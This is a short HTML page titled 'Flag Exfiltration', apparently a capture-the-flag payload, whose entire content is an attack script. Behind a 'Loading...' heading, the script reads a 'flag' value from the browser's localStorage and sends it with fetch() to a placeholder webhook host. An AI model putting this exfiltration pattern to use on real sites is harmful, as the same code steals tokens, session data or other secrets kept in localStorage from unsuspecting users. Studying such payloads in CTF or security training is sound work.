<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Flag Exfiltration</title>
</head>
<body>
  <h1>Loading...</h1>
  <script>
    // Fetch the flag from localStorage
    const flag = localStorage.getItem("flag");

    // Send the flag to your webhook
    fetch("https://your-webhook-url.com?flag=" + encodeURIComponent(flag))
      .then(() => console.log("Flag sent"))
      .catch((error) => console.error("Error sending flag:", error));
  </script>
</body>
</html>
